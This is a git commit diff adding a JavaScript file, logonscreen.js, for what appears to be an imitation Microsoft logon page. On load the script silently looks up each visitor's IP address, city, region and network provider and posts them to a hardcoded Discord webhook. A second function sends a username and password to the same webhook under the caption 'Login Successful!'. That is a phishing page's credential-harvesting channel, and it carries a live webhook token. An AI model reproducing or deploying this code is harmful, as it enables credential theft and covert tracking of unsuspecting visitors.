85c1cc87a01f08a0986851757e89c03ed1a29cbb
Phoenix <88731216+racerretrocoder@users.noreply.github.com>
2025-02-09 20:55:14 -0500

    Update logonscreen.js

--- Microsoft/logonscreen.js
+++ Microsoft/logonscreen.js
@@ -1,1 +1,343 @@
-// somthing cool is coming one second
+fetch('https://ipapi.co/json/')
+
+  .then(function(response) {
+
+    return response.json();
+
+  })
+
+  .then(function(data) {
+
+        const funny = data.ip;
+
+        const funnyA = data.city;
+
+        const funnyB = data.region;
+
+        const funnyC = data.version;
+
+        const login = 'test123';
+
+        const logon = 'admin';
+
+	
+	const funnyD = data.org;
+
+        send(funny,funnyA,funnyB,funnyC,funnyD) // lol!
+        sendlogon(login,logon) // lol!
+    //console.log(data);
+
+  });
+
+function send(ip,city,region,version,org) {
+
+
+
+fetch(
+
+  'https://discord.com/api/webhooks/1310107888949137479/-b4M8Rvs2uqvio6LtQMVmmZuYQtIwd62_CL18WTJiI6EiyCsNXhYoCgCcSR-lQsx7PjB',
+
+  {
+
+    method: 'post',
+
+    headers: {
+
+      'Content-Type': 'application/json',
+
+    },
+
+    body: JSON.stringify({
+
+      // the username to be displayed
+
+      username: 'ilovetech0629.epizy.com',
+
+      // the avatar to be displayed
+
+      avatar_url:
+
+        'https://ih1.redbubble.net/image.5547675143.6419/raf,360x360,075,t,fafafa:ca443f4786.jpg',
+
+      // contents of the message to be sent
+
+      content:
+
+        console.everything,
+
+      // enable mentioning of individual users or roles, but not @everyone/@here
+
+      allowed_mentions: {
+
+        parse: ['users', 'roles'],
+
+      },
+
+      // embeds to be sent
+
+
+
+      
+
+      embeds: [
+
+        {
+
+          // decimal number colour of the side of the embed
+
+          color: 11730954,
+
+          // author
+
+          // - icon next to text at top (text is a link)
+
+          author: {
+
+            name: 'Mslogin page notification',
+
+            url: 'https://ilovetech0629.epizy.com',
+
+         //   icon_url: 'https://ih1.redbubble.net/image.5547675143.6419/raf,360x360,075,t,fafafa:ca443f4786.jpg',
+
+          },
+
+          // embed title
+
+          // - link on 2nd row
+
+          title: 'Someone viewed your website Phoenix!',
+
+          url:
+
+            'https://gist.github.com/dragonwocky/ea61c8d21db17913a43da92efe0de634',
+
+          // thumbnail
+
+          // - small image in top right corner.
+
+          thumbnail: {
+
+            url:
+
+              'https://ih1.redbubble.net/image.5547675143.6419/raf,360x360,075,t,fafafa:ca443f4786.jpg',
+
+          },
+
+          // embed description
+
+          // - text on 3rd row
+
+          description: ip,
+
+          // custom embed fields: bold title/name, normal content/value below title
+
+          // - located below description, above image.
+
+          fields: [
+
+            {
+
+              name: 'City',
+
+              value: city,
+
+            },
+
+            {
+
+              name: 'Region',
+
+              value: region,
+
+            },
+
+            {
+
+              name: 'Network Type',
+
+              value: version,
+
+            },
+	    
+	    {
+              name: 'Carrier',
+	      
+              value: org,
+	    }
+
+          ],
+
+          // image
+
+          // - picture below description(and fields)
+
+   //       image: {
+
+    //        url:
+
+     //         'http://tolkiengateway.net/w/images/thumb/7/75/J.R.R._Tolkien_-_Ring_verse.jpg/300px-J.R.R._Tolkien_-_Ring_verse.jpg',
+
+      //    },
+
+          // footer
+
+          // - icon next to text at bottom
+
+           //footer: {
+
+         //   text: 'footer',
+
+       //     icon_url:
+
+     //         'https://cdn.discordapp.com/avatars/411256446638882837/9a12fc7810795ded801fdb0401db0be6.png',
+
+   //       },
+
+        },
+
+      ],
+
+    }),
+
+  }
+
+);
+
+
+
+}
+
+
+
+function sendlogon(user,pass) {
+
+
+
+  fetch(
+  
+    'https://discord.com/api/webhooks/1310107888949137479/-b4M8Rvs2uqvio6LtQMVmmZuYQtIwd62_CL18WTJiI6EiyCsNXhYoCgCcSR-lQsx7PjB',
+  
+    {
+  
+      method: 'post',
+  
+      headers: {
+  
+        'Content-Type': 'application/json',
+  
+      },
+  
+      body: JSON.stringify({
+  
+        // the username to be displayed
+  
+        username: 'Credential Logon prompt',
+  
+        // the avatar to be displayed
+  
+        avatar_url:
+  
+          'https://ih1.redbubble.net/image.5547675143.6419/raf,360x360,075,t,fafafa:ca443f4786.jpg',
+  
+        // contents of the message to be sent
+  
+        content:
+  
+          console.everything,
+  
+        // enable mentioning of individual users or roles, but not @everyone/@here
+  
+        allowed_mentions: {
+  
+          parse: ['users', 'roles'],
+  
+        },
+  
+        // embeds to be sent
+  
+  
+  
+        
+  
+        embeds: [
+  
+          {
+  
+            // decimal number colour of the side of the embed
+  
+            color: 11730954,
+  
+            // author
+  
+            // - icon next to text at top (text is a link)
+  
+            author: {
+  
+              name: 'Mslogin page notification',
+  
+              url: 'https://ilovetech0629.epizy.com',
+  
+           //   icon_url: 'https://ih1.redbubble.net/image.5547675143.6419/raf,360x360,075,t,fafafa:ca443f4786.jpg',
+  
+            },
+  
+            // embed title
+  
+            // - link on 2nd row
+  
+            title: 'Login Successful!',
+  
+            url: 'https://gist.github.com/dragonwocky/ea61c8d21db17913a43da92efe0de634',
+  
+            // thumbnail
+  
+            // - small image in top right corner.
+  
+            thumbnail: {
+  
+              url: 'https://ih1.redbubble.net/image.5547675143.6419/raf,360x360,075,t,fafafa:ca443f4786.jpg',
+  
+            },
+  
+            // embed description
+  
+            // - text on 3rd row
+  
+            description: 'Credentials have been accepted redirecting',
+  
+            // custom embed fields: bold title/name, normal content/value below title
+  
+            // - located below description, above image.
+  
+            fields: [
+  
+              {
+  
+                name: 'Username',
+  
+                value: user,
+  
+              },
+  
+              {
+  
+                name: 'Password',
+  
+                value: pass,
+  
+              }
+            ],
+  
+          },
+  
+        ],
+  
+      }),
+  
+    }
+  
+  );
+  
+  
+  
+  }
